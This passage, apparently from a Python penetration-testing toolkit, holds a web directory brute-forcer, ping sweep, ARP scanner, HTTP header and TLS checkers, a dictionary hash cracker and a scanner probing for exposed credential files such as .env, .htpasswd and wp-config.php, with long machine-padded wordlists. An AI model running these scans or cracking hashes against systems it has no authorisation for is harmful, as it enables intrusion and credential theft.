    "endpoint6", "endpoint7", "endpoint8", "endpoint9", "endpoint10", "route", 
    "route1", "route2", "route3", "route4", "route5", "route6", "route7", "route8", 
    "route9", "route10", "path", "path1", "path2", "path3", "path4", "path5", 
    "path6", "path7", "path8", "path9", "path10", "uri", "uri1", "uri2", "uri3", 
    "uri4", "uri5", "uri6", "uri7", "uri8", "uri9", "uri10", "url", "url1", 
    "url2", "url3", "url4", "url5", "url6", "url7", "url8", "url9", "url10", 
    "link", "link1", "link2", "link3", "link4", "link5", "link6", "link7", 
    "link8", "link9", "link10", "redirect", "redirect1", "redirect2", "redirect3", 
    "redirect4", "redirect5", "redirect6", "redirect7", "redirect8", "redirect9", 
    "redirect10", "proxy", "proxy1", "proxy2", "proxy3", "proxy4", "proxy5", 
    "proxy6", "proxy7", "proxy8", "proxy9", "proxy10", "gateway", "gateway1", 
    "gateway2", "gateway3", "gateway4", "gateway5", "gateway6", "gateway7", 
    "gateway8", "gateway9", "gateway10", "bridge", "bridge1", "bridge2", "bridge3", 
    "bridge4", "bridge5", "bridge6", "bridge7", "bridge8", "bridge9", "bridge10", 
    "tunnel", "tunnel1", "tunnel2", "tunnel3", "tunnel4", "tunnel5", "tunnel6", 
    "tunnel7", "tunnel8", "tunnel9", "tunnel10", "vpn", "vpn1", "vpn2", "vpn3", 
    "vpn4", "vpn5", "vpn6", "vpn7", "vpn8", "vpn9", "vpn10", "ssh", "ssh1", 
    "ssh2", "ssh3", "ssh4", "ssh5", "ssh6", "ssh7", "ssh8", "ssh9", "ssh10", 
    "ftp", "ftp1", "ftp2", "ftp3", "ftp4", "ftp5", "ftp6", "ftp7", "ftp8", 
    "ftp9", "ftp10", "sftp", "sftp1", "sftp2", "sftp3", "sftp4", "sftp5", 
    "sftp6", "sftp7", "sftp8", "sftp9", "sftp10", "rsync", "rsync1", "rsync2", 
    "rsync3", "rsync4", "rsync5", "rsync6", "rsync7", "rsync8", "rsync9", 
    "rsync10", "scp", "scp1", "scp2", "scp3", "scp4", "scp5", "scp6", "scp7", 
    "scp8", "scp9", "scp10", "telnet", "telnet1", "telnet2", "telnet3", 
    "telnet4", "telnet5", "telnet6", "telnet7", "telnet8", "telnet9", "telnet10", 
    "rsh", "rsh1", "rsh2", "rsh3", "rsh4", "rsh5", "rsh6", "rsh7", "rsh8", 
    "rsh9", "rsh10", "rlogin", "rlogin1", "rlogin2", "rlogin3", "rlogin4", 
    "rlogin5", "rlogin6", "rlogin7", "rlogin8", "rlogin9", "rlogin10", "rexec", 
    "rexec1", "rexec2", "rexec3", "rexec4", "rexec5", "rexec6", "rexec7", 
    "rexec8", "rexec9", "rexec10", "rpc", "rpc1", "rpc2", "rpc3", "rpc4", 
    "rpc5", "rpc6", "rpc7", "rpc8", "rpc9", "rpc10", "nfs", "nfs1", "nfs2", 
    "nfs3", "nfs4", "nfs5", "nfs6", "nfs7", "nfs8", "nfs9", "nfs10", "smb", 
    "smb1", "smb2", "smb3", "smb4", "smb5", "smb6", "smb7", "smb8", "smb9", 
    "smb10", "cifs", "cifs1", "cifs2", "cifs3", "cifs4", "cifs5", "cifs6", 
    "cifs7", "cifs8", "cifs9", "cifs10", "samba", "samba1", "samba2", "samba3", 
    "samba4", "samba5", "samba6", "samba7", "samba8", "samba9", "samba10", 
    "ldap", "ldap1", "ldap2", "ldap3", "ldap4", "ldap5", "ldap6", "ldap7", 
    "ldap8", "ldap9", "ldap10", "kerberos", "kerberos1", "kerberos2", "kerberos3", 
    "kerberos4", "kerberos5", "kerberos6", "kerberos7", "kerberos8", "kerberos9", 
    "kerberos10", "radius", "radius1", "radius2", "radius3", "radius4", "radius5", 
    "radius6", "radius7", "radius8", "radius9", "radius10", "tacacs", "tacacs1", 
    "tacacs2", "tacacs3", "tacacs4", "tacacs5", "tacacs6", "tacacs7", "tacacs8", 
    "tacacs9", "tacacs10", "dns", "dns1", "dns2", "dns3", "dns4", "dns5", "dns6", 
    "dns7", "dns8", "dns9", "dns10", "dhcp", "dhcp1", "dhcp2", "dhcp3", "dhcp4", 
    "dhcp5", "dhcp6", "dhcp7", "dhcp8", "dhcp9", "dhcp10", "ntp", "ntp1", "ntp2", 
    "ntp3", "ntp4", "ntp5", "ntp6", "ntp7", "ntp8", "ntp9", "ntp10", "snmp", 
    "snmp1", "snmp2", "snmp3", "snmp4", "snmp5", "snmp6", "snmp7", "snmp8", 
    "snmp9", "snmp10", "syslog", "syslog1", "syslog2", "syslog3", "syslog4", 
    "syslog5", "syslog6"
    ]

    found_directories = []

    def check_directory(directory):
        full_url = f"{url}/{directory}"
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
            response = requests.get(full_url, headers=headers, timeout=timeout)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] Found: {full_url}{Style.RESET_ALL}")
                found_directories.append(full_url)
        except requests.exceptions.RequestException:
            pass

    # Use ThreadPoolExecutor for concurrent requests
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(check_directory, directory) for directory in common_directories]
        
        # Simple progress indicator
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            print(f"{Fore.YELLOW}Progress: {i+1}/{len(common_directories)}{Style.RESET_ALL}", end="\r")

    print(f"\n{Fore.CYAN}Directory brute-forcing completed. Found {len(found_directories)} directories.{Style.RESET_ALL}")
#===================================================================================================================================
# Function for ping sweep
def ping_sweep(network, timeout=1, max_workers=50):
    print(f"\n{Fore.CYAN}Pinging {network}...{Style.RESET_ALL}")

    # Validate network address format
    if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}$", network):
        print(f"{Fore.RED}Error: Invalid network address format. Use 'X.X.X'.{Style.RESET_ALL}")
        return

    active_ips = []

    def ping_ip(ip):
        try:
            # Use the appropriate ping command based on the OS
            if subprocess.os.name == "nt":  # Windows
                command = ["ping", "-n", "1", "-w", str(timeout * 1000), ip]
            else:  # Unix-based systems (Linux, macOS)
                command = ["ping", "-c", "1", "-W", str(timeout), ip]
            
            subprocess.check_call(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{Fore.GREEN}[+] {ip} is up{Style.RESET_ALL}")
            active_ips.append(ip)
        except subprocess.CalledProcessError:
            pass

    # Use ThreadPoolExecutor for concurrent pings
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(ping_ip, f"{network}.{i}") for i in range(1, 255)]
        
        # Simple progress indicator
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            print(f"{Fore.YELLOW}Progress: {i+1}/254{Style.RESET_ALL}", end="\r")

    print(f"\n{Fore.CYAN}Ping sweep completed. Found {len(active_ips)} active IPs.{Style.RESET_ALL}")
#=========================================================================================  ====    ==  =   =   =   =   


def http_header_analysis(url, timeout=10):
    print(f"\n{Fore.CYAN}Analyzing HTTP headers for {url}...{Style.RESET_ALL}")

    # Security-related headers to highlight
    security_headers = [
        "Content-Security-Policy", "Strict-Transport-Security", "X-Content-Type-Options",
        "X-Frame-Options", "X-XSS-Protection", "Referrer-Policy", "Permissions-Policy",
        "Expect-CT", "Feature-Policy"
    ]

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
        }
        response = requests.get(url, headers=headers, timeout=timeout)
        response.raise_for_status()  # Raise an exception for HTTP errors

        print(f"{Fore.GREEN}HTTP Headers:{Style.RESET_ALL}")
        for header, value in response.headers.items():
            if header in security_headers:
                print(f"{Fore.RED}{header}: {value}{Style.RESET_ALL}")  # Highlight security headers
            else:
                print(f"{Fore.YELLOW}{header}: {value}{Style.RESET_ALL}")

        # Check for missing security headers
        missing_headers = [h for h in security_headers if h not in response.headers]
        if missing_headers:
            print(f"\n{Fore.RED}Missing Security Headers:{Style.RESET_ALL}")
            for header in missing_headers:
                print(f"{Fore.RED}- {header}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}All security headers are present.{Style.RESET_ALL}")

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Error: Failed to retrieve headers. {e}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Unexpected error: {e}{Style.RESET_ALL}")
#==============================================================================================================================

def hash_cracker(hash_value, algorithm="md5", max_workers=10):
    print(f"\n{Fore.CYAN}Cracking hash: {hash_value} using {algorithm.upper()}...{Style.RESET_ALL}")

    # Supported hash algorithms
    supported_algorithms = {
        "md5": hashlib.md5,
        "sha1": hashlib.sha1,
        "sha256": hashlib.sha256,
        "sha512": hashlib.sha512,
    }

    if algorithm not in supported_algorithms:
        print(f"{Fore.RED}Error: Unsupported hash algorithm. Choose from: {', '.join(supported_algorithms.keys())}{Style.RESET_ALL}")
        return

    hash_func = supported_algorithms[algorithm]

    # Dynamic wordlist of common passwords
    common_passwords = [
        "password", "123456", "12345678", "1234", "qwerty", "12345", "dragon", "baseball", 
        "football", "letmein", "monkey", "abc123", "mustang", "michael", "shadow", "master", 
        "jennifer", "111111", "2000", "jordan", "superman", "harley", "1234567", "freedom", 
        "hello", "charlie", "trustno1", "123123", "starwars", "welcome", "admin", "login", 
        "passw0rd", "password1", "123456789", "1234567890", "qwerty123", "1q2w3e4r", "sunshine", 
        "iloveyou", "princess", "solo", "wizard", "password123", "admin123", "letmein123", 
        "123qwe", "123abc", "123456a", "123456b", "123456c", "123456d", "123456e", "123456f", 
        "123456g", "123456h", "123456i", "123456j", "123456k", "123456l", "123456m", "123456n", 
        "123456o", "123456p", "123456q", "123456r", "123456s", "123456t", "123456u", "123456v", 
        "123456w", "123456x", "123456y", "123456z", "qwertyuiop", "asdfghjkl", "zxcvbnm", 
        "qazwsx", "password!", "password@", "password#", "password$", "password%", "password^", 
        "password&", "password*", "password(", "password)", "password-", "password_", "password+", 
        "password=", "password{", "password}", "password[", "password]", "password|", "password\\", 
        "password:", "password;", "password\"", "password'", "password<", "password>", "password?", 
        "password/", "password`", "password~", "password.", "password,", "password ", "password0", 
        "password01", "password02", "password03", "password04", "password05", "password06", 
        "password07", "password08", "password09", "password10", "password11", "password12", 
        "password13", "password14", "password15", "password16", "password17", "password18", 
        "password19", "password20", "password21", "password22", "password23", "password24", 
        "password25", "password26", "password27", "password28", "password29", "password30", 
        "password31", "password32", "password33", "password34", "password35", "password36", 
        "password37", "password38", "password39", "password40", "password41", "password42", 
        "password43", "password44", "password45", "password46", "password47", "password48", 
        "password49", "password50", "password51", "password52", "password53", "password54", 
        "password55", "password56", "password57", "password58", "password59", "password60", 
        "password61", "password62", "password63", "password64", "password65", "password66", 
        "password67", "password68", "password69", "password70", "password71", "password72", 
        "password73", "password74", "password75", "password76", "password77", "password78", 
        "password79", "password80", "password81", "password82", "password83", "password84", 
        "password85", "password86", "password87", "password88", "password89", "password90", 
        "password91", "password92", "password93", "password94", "password95", "password96", 
        "password97", "password98", "password99", "password100"
    ]

    found = False

    def check_word(word):
        nonlocal found
        if found:  # Stop if the hash is already cracked
            return
        hashed_word = hash_func(word.encode()).hexdigest()
        if hashed_word == hash_value:
            print(f"{Fore.GREEN}[+] Found: {word}{Style.RESET_ALL}")
            found = True

    # Use ThreadPoolExecutor for concurrent hash checking
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(check_word, word) for word in common_passwords]
        
        # Simple progress indicator
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            if found:
                break  # Stop if the hash is cracked
            print(f"{Fore.YELLOW}Progress: {i+1}/{len(common_passwords)}{Style.RESET_ALL}", end="\r")

    if not found:
        print(f"{Fore.RED}[-] Hash not found in the common password list.{Style.RESET_ALL}")
#=-============================================             ==  =   =   =   =   =   =   =   =   =   =   

#arp scan 
def arp_scan(network, timeout=2, max_workers=50):
    print(f"\n{Fore.CYAN}Scanning {network} for active devices...{Style.RESET_ALL}")

    # Validate network address format
    if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$", network):
        print(f"{Fore.RED}Error: Invalid network address format. Use 'X.X.X.X/Y'.{Style.RESET_ALL}")
        return

    active_devices = []

    def scan_ip(ip):
        arp = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=timeout, verbose=0)[0]
        for sent, received in result:
            active_devices.append((received.psrc, received.hwsrc))

    # Generate list of IPs to scan
    ips = [f"{network.rsplit('.', 1)[0]}.{i}" for i in range(1, 255)]

    # Use ThreadPoolExecutor for concurrent scanning
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(scan_ip, ip) for ip in ips]
        
        # Simple progress indicator
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            print(f"{Fore.YELLOW}Progress: {i+1}/{len(ips)}{Style.RESET_ALL}", end="\r")

    # Display results
    if active_devices:
        print(f"\n{Fore.GREEN}Active devices:{Style.RESET_ALL}")
        for ip, mac in active_devices:
            print(f"{Fore.GREEN}[+] {ip} is up (MAC: {mac}){Style.RESET_ALL}")
    else:
        print(f"\n{Fore.RED}No active devices found.{Style.RESET_ALL}")
# Function for SSL/TLS checker
def ssl_tls_checker(url):
    print(f"\n{Fore.CYAN}Checking SSL/TLS for {url}...{Style.RESET_ALL}")
    try:
        hostname = url.split("//")[-1].split("/")[0]
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                print(f"{Fore.YELLOW}SSL/TLS Certificate for {hostname}:{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Issuer: {cert['issuer']}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Valid From: {cert['notBefore']}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Valid Until: {cert['notAfter']}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

#===============================================================================================

def vulnerability_scanner(url, timeout=10):
    print(f"\n{Fore.CYAN}Scanning {url} for common vulnerabilities...{Style.RESET_ALL}")

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
        }
        response = requests.get(url, headers=headers, timeout=timeout)
        response.raise_for_status()  # Raise an exception for HTTP errors

        # Check for missing security headers
        if "X-Frame-Options" not in response.headers:
            print(f"{Fore.RED}[-] Missing X-Frame-Options header (Clickjacking vulnerability){Style.RESET_ALL}")
            print(f"{Fore.YELLOW}   Explanation: The X-Frame-Options header prevents your site from being embedded in an iframe, which can be used for clickjacking attacks.{Style.RESET_ALL}")

        if "Content-Security-Policy" not in response.headers:
            print(f"{Fore.RED}[-] Missing Content-Security-Policy header (XSS vulnerability){Style.RESET_ALL}")
            print(f"{Fore.YELLOW}   Explanation: The Content-Security-Policy header helps prevent cross-site scripting (XSS) attacks by controlling which resources can be loaded.{Style.RESET_ALL}")

        if "Strict-Transport-Security" not in response.headers:
            print(f"{Fore.RED}[-] Missing Strict-Transport-Security header (HTTPS enforcement vulnerability){Style.RESET_ALL}")
            print(f"{Fore.YELLOW}   Explanation: The Strict-Transport-Security header ensures that the browser only connects to the site over HTTPS, preventing downgrade attacks.{Style.RESET_ALL}")

        # Check for insecure cookies
        if "Set-Cookie" in response.headers:
            cookies = response.headers["Set-Cookie"].split(", ")
            for cookie in cookies:
                if "Secure" not in cookie:
                    print(f"{Fore.RED}[-] Insecure cookie (Missing Secure flag){Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}   Explanation: Cookies without the Secure flag can be transmitted over unencrypted HTTP, making them vulnerable to interception.{Style.RESET_ALL}")
                if "HttpOnly" not in cookie:
                    print(f"{Fore.RED}[-] Insecure cookie (Missing HttpOnly flag){Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}   Explanation: Cookies without the HttpOnly flag can be accessed by JavaScript, making them vulnerable to XSS attacks.{Style.RESET_ALL}")

        # Check for server information leakage
        if "Server" in response.headers:
            print(f"{Fore.YELLOW}[!] Server information exposed: {response.headers['Server']}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}   Explanation: Exposing server information can help attackers tailor their attacks to specific server vulnerabilities.{Style.RESET_ALL}")

        # Check for directory listing
        if "Index of" in response.text:
            print(f"{Fore.RED}[-] Directory listing enabled{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}   Explanation: Directory listing exposes the contents of a directory, which can lead to unauthorized access to sensitive files.{Style.RESET_ALL}")

        # Check for common vulnerable files
        common_vulnerable_files = [ "/robots.txt", "/.git/", "/.env", "/wp-config.php", "/.htaccess", "/.svn/", 
    "/.DS_Store", "/.idea/", "/.vscode/", "/.well-known/", "/.htpasswd", 
    "/.gitignore", "/.git/config", "/.git/HEAD", "/.git/logs/HEAD", 
    "/.git/refs/heads/master", "/.git/index", "/.git/description", 
    "/.git/hooks/", "/.git/info/exclude", "/.git/objects/", "/.git/packed-refs", 
    "/.git/COMMIT_EDITMSG", "/.git/FETCH_HEAD", "/.git/ORIG_HEAD", 
    "/.git/config", "/.git/info/refs", "/.git/logs/refs/heads/master", 
    "/.git/logs/refs/remotes/origin/HEAD", "/.git/logs/refs/stash", 
    "/.git/refs/remotes/origin/HEAD", "/.git/refs/stash", "/.git/refs/tags/", 
    "/.git/refs/heads/", "/.git/refs/remotes/", "/.git/refs/remotes/origin/", 
    "/.git/refs/remotes/origin/master", "/.git/refs/remotes/origin/HEAD", 
    "/.git/refs/remotes/origin/develop", "/.git/refs/remotes/origin/main", 
    "/.git/refs/remotes/origin/feature/", "/.git/refs/remotes/origin/bugfix/", 
    "/.git/refs/remotes/origin/hotfix/", "/.git/refs/remotes/origin/release/", 
    "/.git/refs/remotes/origin/version/", "/.git/refs/remotes/origin/v1.0.0", 
    "/.git/refs/remotes/origin/v2.0.0", "/.git/refs/remotes/origin/v3.0.0", 
    "/.git/refs/remotes/origin/v4.0.0", "/.git/refs/remotes/origin/v5.0.0", 
    "/.git/refs/remotes/origin/v6.0.0", "/.git/refs/remotes/origin/v7.0.0", 
    "/.git/refs/remotes/origin/v8.0.0", "/.git/refs/remotes/origin/v9.0.0", 
    "/.git/refs/remotes/origin/v10.0.0", "/.git/refs/remotes/origin/v11.0.0", 
    "/.git/refs/remotes/origin/v12.0.0", "/.git/refs/remotes/origin/v13.0.0", 
    "/.git/refs/remotes/origin/v14.0.0", "/.git/refs/remotes/origin/v15.0.0", 
    "/.git/refs/remotes/origin/v16.0.0", "/.git/refs/remotes/origin/v17.0.0", 
    "/.git/refs/remotes/origin/v18.0.0", "/.git/refs/remotes/origin/v19.0.0", 
    "/.git/refs/remotes/origin/v20.0.0", "/.git/refs/remotes/origin/v21.0.0", 
    "/.git/refs/remotes/origin/v22.0.0", "/.git/refs/remotes/origin/v23.0.0", 
    "/.git/refs/remotes/origin/v24.0.0", "/.git/refs/remotes/origin/v25.0.0", 
    "/.git/refs/remotes/origin/v26.0.0", "/.git/refs/remotes/origin/v27.0.0", 
    "/.git/refs/remotes/origin/v28.0.0", "/.git/refs/remotes/origin/v29.0.0", 
    "/.git/refs/remotes/origin/v30.0.0", "/.git/refs/remotes/origin/v31.0.0", 
    "/.git/refs/remotes/origin/v32.0.0", "/.git/refs/remotes/origin/v33.0.0", 
    "/.git/refs/remotes/origin/v34.0.0", "/.git/refs/remotes/origin/v35.0.0", 
    "/.git/refs/remotes/origin/v36.0.0", "/.git/refs/remotes/origin/v37.0.0", 
    "/.git/refs/remotes/origin/v38.0.0", "/.git/refs/remotes/origin/v39.0.0", 
    "/.git/refs/remotes/origin/v40.0.0", "/.git/refs/remotes/origin/v41.0.0", 
    "/.git/refs/remotes/origin/v42.0.0", "/.git/refs/remotes/origin/v43.0.0", 
    "/.git/refs/remotes/origin/v44.0.0", "/.git/refs/remotes/origin/v45.0.0", 
    "/.git/refs/remotes/origin/v46.0.0", "/.git/refs/remotes/origin/v47.0.0", 
    "/.git/refs/remotes/origin/v48.0.0", "/.git/refs/remotes/origin/v49.0.0", 
    "/.git/refs/remotes/origin/v50.0.0", "/.git/refs/remotes/origin/v51.0.0", 
    "/.git/refs/remotes/origin/v52.0.0", "/.git/refs/remotes/origin/v53.0.0", 
    "/.git/refs/remotes/origin/v54.0.0", "/.git/refs/remotes/origin/v55.0.0", 
    "/.git/refs/remotes/origin/v56.0.0", "/.git/refs/remotes/origin/v57.0.0", 
    "/.git/refs/remotes/origin/v58.0.0", "/.git/refs/remotes/origin/v59.0.0", 
    "/.git/refs/remotes/origin/v60.0.0", "/.git/refs/remotes/origin/v61.0.0", 
    "/.git/refs/remotes/origin/v62.0.0", "/.git/refs/remotes/origin/v63.0.0", 
    "/.git/refs/remotes/origin/v64.0.0", "/.git/refs/remotes/origin/v65.0.0", 
    "/.git/refs/remotes/origin/v66.0.0", "/.git/refs/remotes/origin/v67.0.0", 
    "/.git/refs/remotes/origin/v68.0.0", "/.git/refs/remotes/origin/v69.0.0", 
    "/.git/refs/remotes/origin/v70.0.0", "/.git/refs/remotes/origin/v71.0.0", 
    "/.git/refs/remotes/origin/v72.0.0", "/.git/refs/remotes/origin/v73.0.0", 
    "/.git/refs/remotes/origin/v74.0.0", "/.git/refs/remotes/origin/v75.0.0", 
    "/.git/refs/remotes/origin/v76.0.0", "/.git/refs/remotes/origin/v77.0.0", 
    "/.git/refs/remotes/origin/v78.0.0", "/.git/refs/remotes/origin/v79.0.0", 
    "/.git/refs/remotes/origin/v80.0.0", "/.git/refs/remotes/origin/v81.0.0", 
    "/.git/refs/remotes/origin/v82.0.0", "/.git/refs/remotes/origin/v83.0.0", 
    "/.git/refs/remotes/origin/v84.0.0", "/.git/refs/remotes/origin/v85.0.0", 
    "/.git/refs/remotes/origin/v86.0.0", "/.git/refs/remotes/origin/v87.0.0", 
    "/.git/refs/remotes/origin/v88.0.0", "/.git/refs/remotes/origin/v89.0.0", 
    "/.git/refs/remotes/origin/v90.0.0", "/.git/refs/remotes/origin/v91.0.0", 
    "/.git/refs/remotes/origin/v92.0.0", "/.git/refs/remotes/origin/v93.0.0", 
    "/.git/refs/remotes/origin/v94.0.0", "/.git/refs/remotes/origin/v95.0.0", 
    "/.git/refs/remotes/origin/v96.0.0", "/.git/refs/remotes/origin/v97.0.0", 
    "/.git/refs/remotes/origin/v98.0.0", "/.git/refs/remotes/origin/v99.0.0", 
    "/.git/refs/remotes/origin/v100.0.0", "/.git/refs/remotes/origin/v101.0.0", 
    "/.git/refs/remotes/origin/v102.0.0", "/.git/refs/remotes/origin/v103.0.0", 
    "/.git/refs/remotes/origin/v104.0.0", "/.git/refs/remotes/origin/v105.0.0", 
    "/.git/refs/remotes/origin/v106.0.0", "/.git/refs/remotes/origin/v107.0.0", 
    "/.git/refs/remotes/origin/v108.0.0", "/.git/refs/remotes/origin/v109.0.0", 
    "/.git/refs/remotes/origin/v110.0.0", "/.git/refs/remotes/origin/v111.0.0", 
    "/.git/refs/remotes/origin/v112.0.0", "/.git/refs/remotes/origin/v113.0.0", 
    "/.git/refs/remotes/origin/v114.0.0", "/.git/refs/remotes/origin/v115.0.0", 
    "/.git/refs/remotes/origin/v116.0.0", "/.git/refs/remotes/origin/v117.0.0", 
    "/.git/refs/remotes/origin/v118.0.0", "/.git/refs/remotes/origin/v119.0.0", 
    "/.git/refs/remotes/origin/v120.0.0", "/.git/refs/remotes/origin/v121.0.0", 
    "/.git/refs/remotes/origin/v122.0.0", "/.git/refs/remotes/origin/v123.0.0", 
    "/.git/refs/remotes/origin/v124.0.0", "/.git/refs/remotes/origin/v125.0.0", 
    "/.git/refs/remotes/origin/v126.0.0", "/.git/refs/remotes/origin/v127.0.0", 
    "/.git/refs/remotes/origin/v128.0.0", "/.git/refs/remotes/origin/v129.0.0", 
    "/.git/refs/remotes/origin/v130.0.0", "/.git/refs/remotes/origin/v131.0.0", 
    "/.git/refs/remotes/origin/v132.0.0", "/.git/refs/remotes/origin/v133.0.0", 
    "/.git/refs/remotes/origin/v134.0.0", "/.git/refs/remotes/origin/v135.0.0", 
    "/.git/refs/remotes/origin/v136.0.0", "/.git/refs/remotes/origin/v137.0.0", 
    "/.git/refs/remotes/origin/v138.0.0", "/.git/refs/remotes/origin/v139.0.0", 
    "/.git/refs/remotes/origin/v140.0.0", "/.git/refs/remotes/origin/v141.0.0", 
    "/.git/refs/remotes/origin/v142.0.0", "/.git/refs/remotes/origin/v143.0.0", 
    "/.git/refs/remotes/origin/v144.0.0", "/.git/refs/remotes/origin/v145.0.0", 
    "/.git/refs/remotes/origin/v146.0.0", "/.git/refs/remotes/origin/v147.0.0", 
    "/.git/refs/remotes/origin/v148.0.0", "/.git/refs/remotes/origin/v149.0.0", 
    "/.git/refs/remotes/origin/v150.0.0", "/.git/refs/remotes/origin/v151.0.0", 
    "/.git/refs/remotes/origin/v152.0.0", "/.git/refs/remotes/origin/v153.0.0", 
    "/.git/refs/remotes/origin/v154.0.0", "/.git/refs/remotes/origin/v155.0.0", 
    "/.git/refs/remotes/origin/v156.0.0", "/.git/refs/remotes/origin/v157.0.0", 
    "/.git/refs/remotes/origin/v158.0.0", "/.git/refs/remotes/origin/v159.0.0", 
    "/.git/refs/remotes/origin/v160.0.0", "/.git/refs/remotes/origin/v161.0.0", 
    "/.git/refs/remotes/origin/v162.0.0", "/.git/refs/remotes/origin/v163.0.0", 
    "/.git/refs/remotes/origin/v164.0.0", "/.git/refs/remotes/origin/v165.0.0", 
    "/.git/refs/remotes/origin/v166.0.0", "/.git/refs/remotes/origin/v167.0.0", 
    "/.git/refs/remotes/origin/v168.0.0", "/.git/refs/remotes/origin/v169.0.0", 
    "/.git/refs/remotes/origin/v170.0.0", "/.git/refs/remotes/origin/v171.0.0", 
    "/.git/refs/remotes/origin/v172.0.0", "/.git/refs/remotes/origin/v173.0.0", 
    "/.git/refs/remotes/origin/v174.0.0", "/.git/refs/remotes/origin/v175.0.0", 
    "/.git/refs/remotes/origin/v176.0.0", "/.git/refs/remotes/origin/v177.0.0", 
    "/.git/refs/remotes/origin/v178.0.0", "/.git/refs/remotes/origin/v179.0.0", 
    "/.git/refs/remotes/origin/v180.0.0", "/.git/refs/remotes/origin/v181.0.0", 
    "/.git/refs/remotes/origin/v182.0.0", "/.git/refs/remotes/origin/v183.0.0", 
    "/.git/refs/remotes/origin/v184.0.0", "/.git/refs/remotes/origin/v185.0.0", 
    "/.git/refs/remotes/origin/v186.0.0", "/.git/refs/remotes/origin/v187.0.0", 
    "/.git/refs/remotes/origin/v188.0.0", "/.git/refs/remotes/origin/v189.0.0", 
    "/.git/refs/remotes/origin/v190.0.0", "/.git/refs/remotes/origin/v191.0.0", 
    "/.git/refs/remotes/origin/v192.0.0", "/.git/refs/remotes/origin/v193.0.0", 
    "/.git/refs/remotes/origin/v194.0.0", "/.git/refs/remotes/origin/v195.0.0", 
    "/.git/refs/remotes/origin/v196.0.0", "/.git/refs/remotes/origin/v197.0.0", 
    "/.git/refs/remotes/origin/v198.0.0", "/.git/refs/remotes/origin/v199.0.0", 
    "/.git/refs/remotes/origin/v200.0.0", "/.git/refs/remotes/origin/v201.0.0", 
    "/.git/refs/remotes/origin/v202.0.0", "/.git/refs/remotes/origin/v203.0.0", 
    "/.git/refs/remotes/origin/v204.0.0", "/.git/refs/remotes/origin/v205.0.0", 
    "/.git/refs/remotes/origin/v206.0.0", "/.git/refs/remotes/origin/v207.0.0", 
    "/.git/refs/remotes/origin/v208.0.0", "/.git/refs/remotes/origin/v209.0.0", 
    "/.git/refs/remotes/origin/v210.0.0", "/.git/refs/remotes/origin/v211.0.0", 
    "/.git/refs/remotes/origin/v212.0.0", "/.git/refs/remotes/origin/v213.0.0", 
    "/.git/refs/remotes/origin/v214.0.0", "/.git/refs/remotes/origin/v215.0.0", 
    "/.git/refs/remotes/origin/v216.0.0", "/.git/refs/remotes/origin/v217.0.0", 
    "/.git/refs/remotes/origin/v218.0.0", "/.git/refs/remotes/origin/v219.0.0", 
    "/.git/refs/remotes/origin/v220.0.0", "/.git/refs/remotes/origin/v221.0.0", 
    "/.git/refs/remotes/origin/v222.0.0", "/.git/refs/remotes/origin/v223.0.0", 
    "/.git/refs/remotes/origin/v224.0.0", "/.git/refs/remotes/origin/v225.0.0", 
    "/.git/refs/remotes/origin/v226.0.0", "/.git/refs/remotes/origin/v227.0.0", 
    "/.git/refs/remotes/origin/v228.0.0", "/.git/refs/remotes/origin/v229.0.0", 
    "/.git/refs/remotes/origin/v230.0.0", "/.git/refs/remotes/origin/v231.0.0", 
    "/.git/refs/remotes/origin/v232.0.0", "/.git/refs/remotes/origin/v233.0.0", 
    "/.git/refs/remotes/origin/v234.0.0", "/.git/refs/remotes/origin/v235.0.0", 
    "/.git/refs/remotes/origin/v236.0.0", "/.git/refs/remotes/origin/v237.0.0", 
    "/.git/refs/remotes/origin/v238.0.0", "/.git/refs/remotes/origin/v239.0.0", 
    "/.git/refs/remotes/origin/v240.0.0", "/.git/refs/remotes/origin/v241.0.0", 
    "/.git/refs/remotes/origin/v242.0.0", "/.git/refs/remotes/origin/v243.0.0", 
    "/.git/refs/remotes/origin/v244.0.0", "/.git/refs/remotes/origin/v245.0.0", 
    "/.git/refs/remotes/origin/v246.0.0", "/.git/refs/remotes/origin/v247.0.0", 
    "/.git/refs/remotes/origin/v248.0.0", "/.git/refs/remotes/origin/v249.0.0", 
    "/.git/refs/remotes/origin/v250.0.0", "/.git/refs/remotes/origin/v251.0.0", 
